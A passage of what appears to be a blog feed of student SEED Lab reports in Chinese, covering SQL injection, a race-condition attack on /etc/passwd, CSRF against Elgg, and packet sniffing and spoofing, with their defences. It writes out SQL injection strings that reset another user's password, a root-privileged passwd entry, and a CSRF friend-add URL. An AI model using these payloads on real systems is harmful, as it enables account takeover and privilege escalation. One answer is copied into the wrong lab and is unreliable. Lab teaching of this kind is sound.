Boby 的口令，这样你就可以登录他的账户，做进一步的破坏。请展示你是如何实现这一目标的。你需要证明你可以用新的口令成功登录 Boby 的账户。需要注意，数据库存储的并非明文形式的口令，而是口令的哈希值。请在unsafe_edit_backend.php 中查看口令的存储方式，程序使用 SHA1 哈希函数来生成口令的哈希值。 由于在数据库中存储口令为sha1加密的，因而在Alice的编辑页面中NickName一项中输入如下指令：</p><table><thead><tr><th>‘,password&#x3D;sha1(‘123’) where Name&#x3D;’Boby’; #</th></tr></thead></table><p>即可成功修改Boby的口令为123</p><p>然后在登陆页面中输入用户名和口令即可成功进入Boby的主页，如下所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151944428.png"></p><h3 id="2-4-Task-4：对策：语句预处理"><a href="#2-4-Task-4：对策：语句预处理" class="headerlink" title="2.4 Task 4：对策：语句预处理"></a>2.4 Task 4：对策：语句预处理</h3><p>请使用语句预处理机制来修复 SQL 注入漏洞。为了简单起见，我们在文件夹 defense 内创建了一个简化程序，你需要对这个文件夹中的文件进行修改。访问下面给出的 URL，你会看到一个类似于 Web应用程序登录页面的网页，在网页中提供正确的用户名和口令即可查询员工的信息。</p><p>进入新的登录页面，利用SQL注入仍然可以成功登入页面，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945671.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945254.png"></p><p>根据实验手册中所给出指导对源码进行修改如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945766.png"></p><p>重新在登录页面进行SQL注入攻击，发现登录进的页面不会显示个人信息：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151945667.png"></p><p>如果输入正确的用户名和口令，仍然可以会显示个人信息如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309151946465.png"></p><p>证明防御措施的部署是成功的。</p><h3 id="2-5-思考题"><a href="#2-5-思考题" class="headerlink" title="2.5 思考题"></a>2.5 思考题</h3><p>假设数据库只存储 password 和 eid 两列的 SHA256 值。使用下面 SQL 语句与数据库交互，其中$passwd 和 $eid 变量的值由用户提供。这个程序是否存在 SQL 注入问题？如果没有，请解释原因；如果有，请给出构造范例。</p><p>答：仍然存在 SQL 注入问题。原因在于参数是可以拼接的， 可以在 eid 一项中输入如下内容： 008,256)’and 1&#x3D;1 # Passwd 中输入如下内容： 123,256)’and 1&#x3D;1 # 都可以成功实现 SQL 注入攻击</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>条件竞争漏洞</title>
      <link href="/2022/10/20/competation%20volunerilty/"/>
      <url>/2022/10/20/competation%20volunerilty/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的学习目标是让学生将从课堂上学到的关于竞争条件漏洞的知识付诸行动，以获得关于竞争条件漏洞的第一手经验。当多个进程同时访问和操作相同的数据时，会出现竞争条件，执行的结果取决于访问发生的特定顺序。如果特权程序存在竞争条件漏洞，攻击者可以运行并行进程与特权程序“竞争”，从而改变程序的行为。</p><span id="more"></span><p>本实验中，学生得到一个包含竞争条件漏洞的程序；他们的任务是开发一种利用漏洞并获得 root 权限的方案。除了攻击方法外，还将引导学生了解几种可用于对抗竞争条件攻击的保护方案。学生需要评估这些方案是否有效，并解释原因。本实验涵盖以下主题：</p><p>1. 竞争条件漏洞</p><p>2. 粘滞符号链接保护</p><p>3. 最小权限原则</p><h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：选择目标"><a href="#2-1-Task-1：选择目标" class="headerlink" title="2.1 Task 1：选择目标"></a>2.1 Task 1：选择目标</h3><p>我们希望利用程序中的竞争条件漏洞。我们选择以普通用户无法写入的口令文件&#x2F;etc&#x2F;passwd 为目标。通过利用该漏洞，我们希望向口令文件添加一条记录，目的是创建一个具有 root 权限的新用户账号.在该口令文件中，每个用户都有一个条目，该条目由七个字段组成并用冒号 (:) 分隔。root 用户的条目如下所示。</p><table><thead><tr><th>root: x :0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</th></tr></thead></table><p>为了验证 magic 值口令是否有效，我们（作为超级用户）手动将以下条目添加到&#x2F;etc&#x2F;passwd文件的末尾。请在报告中说明你是否可以在不键入口令的情况下登录 test 账户，并检查你是否具有 root 权限。</p><table><thead><tr><th>test:U6aMy0wojraho:0:0:test:&#x2F;root:&#x2F;bin&#x2F;bash</th></tr></thead></table><p>利用gedit打开并修改&#x2F;etc&#x2F;passwd 文件，然后进行登录如下，证明具有root权限</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20230914090952.png"></p><h3 id="2-2-Task-2：发起竞争条件攻击"><a href="#2-2-Task-2：发起竞争条件攻击" class="headerlink" title="2.2 Task 2：发起竞争条件攻击"></a>2.2 Task 2：发起竞争条件攻击</h3><p>此任务的目标是利用前面列出的易受攻击的 Set-UID 程序中的竞争条件漏洞。最终目标是获得 root权限。攻击的最关键步骤是使&#x2F;tmp&#x2F;XYZ 指向口令文件，该步骤必须发生在检查和使用之间的窗口内；即在易受攻击程序中的 access 和 fopen 调用之间。</p><h4 id="Task-2-A：模拟一个缓慢的机器"><a href="#Task-2-A：模拟一个缓慢的机器" class="headerlink" title="Task 2.A：模拟一个缓慢的机器"></a>Task 2.A：模拟一个缓慢的机器</h4><p>假设机器非常慢，在 access() 和 fopen() 调用之间有一个 10 秒的时间窗口。通过此添加，vulp 程序（重新编译时)将暂停并将控制权交给操作系统 10 秒。我们的工作是手动执行一些操作，因此当程序在 10 秒后恢复时，该程序可以帮助你将 root 帐户添加到系统中。请演示如何实现这一点。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140912547.png"></p><p>再漏洞程序中进行添加如上代码后，重新编译该程序，并按实验手册进行：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140913020.png"></p><h4 id="Task-2-B：进行真实攻击"><a href="#Task-2-B：进行真实攻击" class="headerlink" title="Task 2.B：进行真实攻击"></a>Task 2.B：进行真实攻击</h4><p>在模拟攻击中，我们使用“ln-s”命令创建&#x2F;更改符号链接。现在我们需要在一个程序中进行。我们可以在 C 中使用 symlink() 来创建符号链接。由于 Linux 不允许在链接已经存在的情况下创建链接，因此我们需要先删除旧链接。下面的 C 代码片段显示了如何删除链接，然后使&#x2F;tmp&#x2F;XYZ 指向&#x2F;etc&#x2F;passwd。请编写你的攻击程序。如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140914093.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140915864.png"></p><p>我们需要多次运行漏洞程序，因此编写一个程序来自动执行此过程。为了避免手动向漏洞程序 vulp 键入输入，我们可以使用输入重定向。也就是说，我们将输入保存在一个文件中，并要求 vulp 使用“vulp &lt; inputFile”从该文件获取输入。我们也可以使用 pipe（稍后将给出一个示例）。该攻击可能需要一段时间才能成功修改口令文件，因此我们需要一种方法来自动检测攻击是否成功。很多方法可以满足此要求；一种简单的方法是监控文件的时间戳。下面的 shell 脚本运行“ls -l”命令，该命令输出关于文件的几条信息，包括上次修改的时间。通过将命令的输出与之前生成的输出进行比较，我们可以判断文件是否已被修改。以下 shell 脚本循环执行易受攻击的程序（vulp），输入由 echo 命令（通过一个 pipe）提供。你需要决定实际输入的内容。如果攻击成功，即 passwd 被修改，则 shell 脚本将停止。本任务需要一定的耐心，通常你能够在 5 分钟内成功。</p><p>执行攻击程序和脚本如下：</p><p>在攻击过程中，可以观察到XYZ文件的符号链接一直在被修改，说明程序执行成功，等待一段时候后：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140916090.png"></p><p>可以观察到攻击成功，可以以test用户身份登录并且验证root权限。</p><h4 id="Task-2-C：一种改进的攻击方法"><a href="#Task-2-C：一种改进的攻击方法" class="headerlink" title="Task 2.C：一种改进的攻击方法"></a>Task 2.C：一种改进的攻击方法</h4><p>首先创建两个符号链接&#x2F;tmp&#x2F;XYZ 和&#x2F;tmp&#x2F;ABC，然后使用 renameat2 系统调用来原子地交换它们。这允许我们在不引入任何竞争条件的情况下更改&#x2F;tmp&#x2F;XYZ 指向的内容。请使用此新策略修改你的攻击策略，然后重试攻击。如果一切正确，你的攻击应该能够成功</p><p>修改后的攻击程序如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140918310.png"></p><p>执行此攻击程序和脚本，结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140918449.png"></p><p>可以观察到攻击一次便成功，可以以test用户身份登录并且验证root权限。</p><h3 id="2-3-Task-3：预防措施"><a href="#2-3-Task-3：预防措施" class="headerlink" title="2.3 Task 3：预防措施"></a>2.3 Task 3：预防措施</h3><h4 id="Task-3-A：应用最小权限原则"><a href="#Task-3-A：应用最小权限原则" class="headerlink" title="Task 3.A：应用最小权限原则"></a>Task 3.A：应用最小权限原则</h4><p>本实验中，漏洞程序的根本问题是违反了最小权限原则。程序员考虑到运行程序的用户可能权限过高，所以他&#x2F;她引入了 access() 来限制用户的能力。然而，这不是正确的方法。更好的方法是应用最小权限原则；也就是说，如果用户不需要某些特权，则该特权需要被禁用。</p><p>我们可以使用 seteuid 系统调用暂时禁用 root 权限，然后在必要时启用它。请使用此方法修复程序中的漏洞，然后重复攻击。你能成功吗？请报告你的观察结果并提供解释。</p><p>修改漏洞程序如下图：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140919935.png"></p><p>重新对程序进行编译并且执行改进后的攻击程序和脚本，结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140919341.png"></p><p>发现攻击始终失败。解释如下：</p><p>调用open()函数的时候，没有root权限，因而无法打开&#x2F;tmp&#x2F;XYZ指向的受的文件passwd。</p><h4 id="Task-3-B：使用-Ubuntu-的内置方案"><a href="#Task-3-B：使用-Ubuntu-的内置方案" class="headerlink" title="Task 3.B：使用 Ubuntu 的内置方案"></a>Task 3.B：使用 Ubuntu 的内置方案</h4><p>Ubuntu 10.10 和更高版本附带了一个内置的防止竞争条件攻击的保护方案。在此任务中，你需要使用以下命令重新启用保护：</p><table><thead><tr><th>$ sudo sysctl -w fs.protected_symlinks&#x3D;1</th></tr></thead></table><p>执行该命令后，重新进行攻击，观察结果如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309140920171.png"></p><p>发现攻击失败，此时XYZ文件的所有者已经成为root。</p><p>解释以下内容：</p><p>1. 该保护方案是如何工作的？</p><p>因为在这种情况下，XYZ文件的所有者是 root，tmp目录的所有者是 root，符号链接所有者是seed。 因而访问将被拒绝</p><p>2. 这个方案有什么局限性？</p><p>该机制仅适用于启用了粘滞位的目录，像 &#x2F;tmp 或 &#x2F;var&#x2F;tmp 这样的粘性位目录。 因此攻击者可以利用其他目录中的竞争条件并获得访问权限。</p><h3 id="2-4-思考题"><a href="#2-4-思考题" class="headerlink" title="2.4 思考题"></a>2.4 思考题</h3><p>最小权限原则可用于有效防御课程中讨论过的竞争条件攻击。我们可以使用相同的原理来阻止缓冲区溢出攻击吗？为什么？即在执行有缺陷的函数之前，我们禁用 root 权限；在函数返回后，我们重新启用特权。</p><p>答：仍然存在 SQL 注入问题。原因在于参数是可以拼接的， 可以在 eid 一项中输入如下内容： 008,256)’and 1&#x3D;1 # Passwd 中输入如下内容： 123,256)’and 1&#x3D;1 # 都可以成功实现 SQL 注入攻击</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Cross-Site Request Forgery Attack Lab</title>
      <link href="/2022/10/11/CSRF/"/>
      <url>/2022/10/11/CSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目的"><a href="#一-实验目的" class="headerlink" title="一.实验目的"></a>一.实验目的</h2><p>本实验的目的是帮助学生了解跨站请求伪造（CSRF）攻击。CSRF 攻击涉及一个受害用户、一个受信任的网站和一个恶意网站。受害用户在访问恶意站点时，正在与受信任的网站保持活动会话。恶意网站将可信网站的HTTP 请求注入到受害者用户会话中，造成损害。</p><span id="more"></span><p>在本实验中，学生们将通过CSRF 攻击来攻击一个社交网络应用。这个开源的社交网络应用被称为Elgg，它已经被安装在我们的虚拟机中。Elgg 中有针对CSRF 的防御措施，但为了达到本实验的目的，我们已经将这些防御措施关闭。本实验覆盖以下主题:</p><p>1. 跨站请求伪造攻击</p><p>2. CSRF 对抗措施：秘密令牌（secret token）和同站cookie（same-site cookie）</p><p>3. HTTP GET 和POST 请求</p><p>4. JavaScript 和Ajax</p><h2 id="二-实验步骤与结果"><a href="#二-实验步骤与结果" class="headerlink" title="二.实验步骤与结果"></a>二.实验步骤与结果</h2><h3 id="2-1-Task-1：观察HTTP-请求"><a href="#2-1-Task-1：观察HTTP-请求" class="headerlink" title="2.1 Task 1：观察HTTP 请求"></a>2.1 Task 1：观察HTTP 请求</h3><p>在跨站请求伪造攻击中，我们需要伪造HTTP 请求。因此，我们需要知道一个合法的HTTP 请求是什么样子的，以及它使用什么参数等。为此，我们可以使用一个名为”HTTP Header Live” 的火狐浏览器插件。本任务的目标是熟悉这个工具。指导中给出了如何使用这个工具的说明(§ 5.1)。请使用这个工具在Elgg 中捕获一个HTTP GET 请求和一个HTTP POST 请求。请在你的报告中指出这些请求中所使用的参数。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221440.png"></p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221450.png"></p><p>在合法用户进行登录利用该工具进行抓取http报文，可以分别得到上图所示的POST报文和GET报文</p><p>在POST报文中，有elgg_token,elgg_ts,username和password等参数，而在GET报文中没有参数显示。</p><h3 id="2-2-Task-2：使用GET-请求的CSRF-攻击"><a href="#2-2-Task-2：使用GET-请求的CSRF-攻击" class="headerlink" title="2.2 Task 2：使用GET 请求的CSRF 攻击"></a>2.2 Task 2：使用GET 请求的CSRF 攻击</h3><p>在这个任务中，我们需要Elgg 社交网络中的两个账户Alice 和Samy。Samy 想成为Alice 的朋友，但Alice 拒绝添加他为好友。Samy 决定使用CSRF 攻击来实现他的目标。他向Alice 发送了一个URL（通过电子邮件或在发布在Elgg 上）。Alice 对这个网址很好奇，点击了这个网址，这就把她带到了Samy 的网站 <a href="http://www.attacker32.com/">www.attacker32.com</a>  。假设你是Samy，描述你如何构建网页的内容，以便当Alice 访问该网页时，Samy 能够被添加到Alice 的好友列表中（假设Alice 有一个活跃的Elgg 会话）</p><p>实现思路：</p><p>通过抓获合法添加好友过程中得到的报文，观察其中的参数结构，然后通过修改其参数，构建网页的内容</p><p>实现步骤：</p><p>首先登录到Samy的用户界面后，合法的把Alice添加为好友，在该过程中利用插件工具进行抓获http报文如下：</p><p>可以看到其url请求为 ”<a href="http://www.seed-server.com/action/friends/add?friend=56%E2%80%9D">http://www.seed-server.com/action/friends/add?friend=56”</a> 开头，该56为Alice的guid</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221545.png"></p><p>因此我们想要让Alice添加Samy为好友的话，需要把friend后的参数修改为Samy的guid。而Samy的guid可以在合法登录到Samy的用户界面后，通过网页的源码得到，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221601.png"></p><p>最后根据得到的gid构造img上所附带的链接，如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221614.png"></p><p>攻击实现如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221635.png"></p><p>在攻击页面中，点击链接后，刷新Alice的好友页面，就可以观察到Samy被成功添加为Alice的好友。</p><h3 id="2-3-Task-3：使用POST-请求的CSRF-攻击"><a href="#2-3-Task-3：使用POST-请求的CSRF-攻击" class="headerlink" title="2.3 Task 3：使用POST 请求的CSRF 攻击"></a>2.3 Task 3：使用POST 请求的CSRF 攻击</h3><p>在把自己加入Alice 的朋友名单后，Samy 想进行更多的攻击。他想让Alice 在她的个人资料中写上”Samy is my Hero”，使得所有人都能够看到。当然，Alice 不喜欢Samy，更不用说把这个声明写进她的个人资料中。Samy 计划使用CSRF 攻击来实现这一目标，也就是这个Task 的目标。</p><p>实现思路：</p><p>同上一个任务中的方法，在合法用户修改个人资料的过程中，利用插件截获http报文后，根据报文中的参数进行修改攻击页面中的内容，即可实现攻击。</p><p>实现步骤：</p><p>首先在Samy的用户页面中，进行修改自己的个人资料，把个人描述修改为“Samy is my hero.”在提交过程中，利用插件进行捕获http报文，得到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221711.png"></p><p>可以看到该链接的网址以及报文中的参数内容，然后根据得到的报文对攻击网页的源码进行修改，即修改网页文件中的field中的参数以及p.action的内容。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221846.png"></p><p>修改后，进入该攻击页面，即可成功修改Alice的个人资料如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221906.png"></p><p>问题回答：</p><p>问题1：如何获取Alice的guid？</p><p>答：在上一个任务中，通过Samy在自己的用户页面添加Alice为好友的过程中，截获http报文，即可得到Alice的guid。</p><p>问题2：如果Boby 想向任何访问他的恶意网页的人发动攻击。在这种情况下，他事先不知道谁在访问该网页。那么他还能发动CSRF 攻击来修改受害者的Elgg 资料吗？请解释原因。</p><p>答：不可以。因为在攻击过程中需要知道受害者的guid并且预先设置好，如果是未知用户访问的话是不能够及时构造的。</p><h3 id="2-4-Task-4：开启Elgg-的防御措施"><a href="#2-4-Task-4：开启Elgg-的防御措施" class="headerlink" title="2.4 Task 4：开启Elgg 的防御措施"></a>2.4 Task 4：开启Elgg 的防御措施</h3><p>开启防御措施要打开防御措施，首先要进入Elgg 容器的&#x2F;var&#x2F;www&#x2F;elgg&#x2F;vendor&#x2F;elgg&#x2F;elgg&#x2F;engine&#x2F;classes&#x2F;Elgg&#x2F;Security 文件夹，从Csrf.php 中删除return 语句。你可以使用一个内置在容器中的简单编辑器，名为nano 。在做了修改之后再次重复之前的攻击，看看你的攻击是否会成功。请指出捕获的HTTP 请求中的秘密令牌，并解释为什么攻击者为什么不能在CSRF 攻击中发送这些秘密令牌；是什么阻止了他们从网页上发现秘密令牌？</p><p>实现步骤：</p><p>首先在容器中修改文件内容，讲return语句注释掉，如下图所示：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130221957.png"></p><p>然后重新进行攻击，可以观察到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222034.png"></p><p>可以发现两次攻击都无法成功，网页会报错”form is missing __token or __ts fields”</p><p>捕获的http请求中的token如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222100.png"></p><p>由于return注释掉后，会执行validate函数，提取出请求中的两个参数__token 和__ts，但是由于在此前构造请求时没有补充这两个参数，因而会报错，并且攻击会失败</p><h3 id="2-5-Task-5：测试同站Cookie-方法"><a href="#2-5-Task-5：测试同站Cookie-方法" class="headerlink" title="2.5 Task 5：测试同站Cookie 方法"></a>2.5 Task 5：测试同站Cookie 方法</h3><p>当访问该网站时，浏览器上会设置三个cookie，分别是：cookie-normal、cookie-lax 和cookie-strict。正如其名称所示，第一个cookie 只是一个普通的cookie，第二个和第三个cookie 是两种不同类型的同站cookie（Lax 和Strict）。我们设计了两组实验来观察当发送HTTP 请求时，哪些cookie 会被附加到服务器上。通常情况下，属于服务器的所有cookie 都将被附加到请求中，除了同站cookie。</p><p>请点击两个实验的链接。链接A 指向example32.com 上的一个页面，而链接B 则指向attacker32.com 上一个页面。两个页面都是相同的（除了背景颜色），并且它们都发送三种不同的请求到 <a href="http://www.example32.com/showcookies.php">www.example32.com/showcookies.php</a> ，这个链接只是显示浏览器发送的cookies。通过观察显示的结果，你可以知道哪些cookie 会被浏览器发送。请完成以下要求：</p><p>• 请描述你所看到的情况，并解释为什么在某些情况下不发送一些cookie。</p><p>在同站请求的三种情况下，三个cookie都被发送</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222143.png"></p><p>在跨站请求的情况下：</p><p>Sending Get Request (link)：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222157.png"></p><p>Sending Get Request (form)：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222254.png"></p><p>Sending Post Request (form)：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222318.png"></p><p>通过观察，可以得知，在跨站请求中，strict值都会阻止浏览器发送cookie到目标站点，而lax值则只有在post请求中才会被阻止发送。解释如下：</p><p>查阅RFC文档中的<a href="https://datatracker.ietf.org/doc/html/draft-ietf-httpbis-rfc6265bis-02#section-5.3.7">samesite</a>部分可以得到如下内容：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure20221130222333.png"></p><p>从中可以得知strict值将阻止浏览器在所有跨网站浏览上下文中将 cookie 发送到目标站点，即使遵循常规链接也是如此。而 Lax 值为希望在用户从外部链接到达后维护用户登录会话的网站提供了安全性和可用性之间的合理平衡，因此在get请求中会发送而在post请求中为了防御CSRF而不会被发送。</p><p>• 根据你的理解，请描述同站cookies 如何帮助服务器检测一个请求是跨站还是同站请求。</p><p>只需要检查该请求中的Strict值是否还在，即可知道该请求是跨站还是同站请求，因为在同站请求中，三个值都会保留而跨站请求中Strict值都不会被发送。</p><p>• 请描述你将如何使用同站cookie机制来帮助Elgg防御CSRF攻击。只需要描述思路，无需实现。</p><p>利用同站cookie和token一同使用，利用strit值进行检查是否为跨站请求。在服务端产生同步token，为用户的每一次会话请求都进行验证。并且token不应该用cookies进行传送，而是作为响应缓存的一部分，比如HTML或者JSON响应。</p>]]></content>
      
      
      <categories>
          
          <category> 软件安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seedlab2.0 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PACKET SPOFFING AND SNIFFING PROJECT</title>
      <link href="/2022/10/02/sniff_spoof/"/>
      <url>/2022/10/02/sniff_spoof/</url>
      
        <content type="html"><![CDATA[<h2 id="一-实验目标"><a href="#一-实验目标" class="headerlink" title="一.实验目标"></a>一.实验目标</h2><p>本实验的目标有两个方面：学习使用这些工具(Wireshark,Tcpdump,Netwox,Scapy)和了解这些工具背后的技术。对于第二个任务，将编写简单的嗅探器和欺骗程序，并获得深入了解这些程序的技术方面。</p><span id="more"></span><p>本实验涵盖以下主题：</p><p>• 嗅探和欺骗的工作原理</p><p>• 使用pcap库和Scapy进行数据包嗅探</p><p>• 使用原始套接字和Scapy进行数据包欺骗</p><p>• 使用Scapy操作数据包</p><h2 id="二-实验原理"><a href="#二-实验原理" class="headerlink" title="二.实验原理"></a>二.实验原理</h2><p>Sniffing就是一种能将本地网卡状态设成‘混杂’状态的模式，当网卡处于这种“混杂”方式时，该网卡具备“广播地址”，它对遇到的每一个帧都产生一个硬件中断以便提醒操作系统处理流经该物理媒体上的每一个报文包。（绝大多数的网卡具备置成混杂模式的能力）</p><p>一般来说，sniffing和poofing会联合起来使用。当攻击者嗅探到关键信息时，通常会使用poofing技术来构造数据包来劫持会话或者去获取更多信息，通常会造成很大的危害。Poofing技术就是攻击者自己构造数据包的ip&#x2F;tcp数据包帧头部数据来达到自己的目的。</p><p>本次实验就是基于以上原理，在linux下模拟整个过程。</p><h2 id="三-实验器材"><a href="#三-实验器材" class="headerlink" title="三.实验器材"></a>三.实验器材</h2><p>1．Ubuntu12.04。</p><p>2．Wireshark等常用捕包工具。</p><h2 id="四-实验步骤及运行结果"><a href="#四-实验步骤及运行结果" class="headerlink" title="四.实验步骤及运行结果"></a>四.实验步骤及运行结果</h2><h3 id="4-1-Lab-Task-Set-1-Using-Tools-to-Sniff-and-Spoof-Packets"><a href="#4-1-Lab-Task-Set-1-Using-Tools-to-Sniff-and-Spoof-Packets" class="headerlink" title="4.1 Lab Task Set 1: Using Tools to Sniff and Spoof Packets"></a>4.1 Lab Task Set 1: Using Tools to Sniff and Spoof Packets</h3><h4 id="4-1-1-Task-1-1-Sniffing-Packets"><a href="#4-1-1-Task-1-1-Sniffing-Packets" class="headerlink" title="4.1.1 Task 1.1: Sniffing Packets"></a>4.1.1 Task 1.1: Sniffing Packets</h4><p>Task 1.1A 上述程序嗅探数据包。对于每个捕获的数据包，回调函数打印 pkt（）将被调用;此函数将打印出有关数据包的一些信息。运行程序根权限，并证明您确实可以捕获数据包。之后，再次运行该程序，但不使用根权限;描述并解释您的观察结果。</p><p>运行结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180928374.png"></p><p>运行sniff时，在主机A中ping主机B可以截取到如上数据包</p><p>如果关掉root在用户状态下运行，会得到如下报错：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180929019.png"></p><p>解释：普通用户没用权限执行sniff程序。</p><p>Task 1.1B. 通常，当我们嗅探数据包时，我们只对某些类型的数据包感兴趣。我们可以做到通过在嗅探中设置过滤器。斯卡皮的过滤器使用BPF（伯克利数据包过滤器）语法;您可以找到来自互联网的 BPF 手册。请设置以下过滤器并再次演示您的嗅探器程序（每个过滤器应单独设置）：</p><p>仅仅捕获ICMP数据包（Task 1.1A中已经实现）</p><p>捕获来自于特定IP地址的TCP数据包并且目的端口号为23</p><p>首先在过滤器中对过滤规则进行更改如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180929023.png"></p><p>然后了解到23端口作用如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180930609.png"></p><p>可以在主机A中执行telnet 10.9.0.6 命令，并且执行sniff程序得到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180930385.png"></p><p>捕获来自于指定子网的数据包</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180930502.png"></p><p>设置过滤器规则如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180931164.png"></p><p>捕获到数据包如下：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180931117.png"></p><h4 id="4-1-2-Task-1-2-Spoofing-ICMP-Packets"><a href="#4-1-2-Task-1-2-Spoofing-ICMP-Packets" class="headerlink" title="4.1.2 Task 1.2: Spoofing ICMP Packets"></a>4.1.2 Task 1.2: Spoofing ICMP Packets</h4><p>在attacker主机中利用虚拟机本地网卡enps03发送伪造数据包，并且利用wireshark进行数据包的截获得到如下结果，可以看到伪造成功。</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180931600.png"></p><h4 id="4-1-3-Task-1-3-Traceroute"><a href="#4-1-3-Task-1-3-Traceroute" class="headerlink" title="4.1.3 Task 1.3: Traceroute"></a>4.1.3 Task 1.3: Traceroute</h4><p>攻击者主机中对ping baidu.com 进行定位计算机和目标计算机之间的所有路由器。分别修改程序中的ttl为3，4，5可以得到如下运行结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180932040.png"></p><h4 id="4-1-4-Sniffing-and-then-Spoofing"><a href="#4-1-4-Sniffing-and-then-Spoofing" class="headerlink" title="4.1.4 Sniffing and-then Spoofing"></a>4.1.4 Sniffing and-then Spoofing</h4><p>单独在主机B中ping 8.8.8.8 可以观察到如下结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180932464.png"></p><p>利用Scapy编写好伪造程序后在攻击者主机中进行运行，同时再次利用主机B进行ping 8.8.8.8 的命令，可以得到如下运行结果：</p><p><img src="https://raw.githubusercontent.com/oooyuanooo/figure/main/D%3A%5CNothing%5Cfigure202309180933091.png"></p><p><img 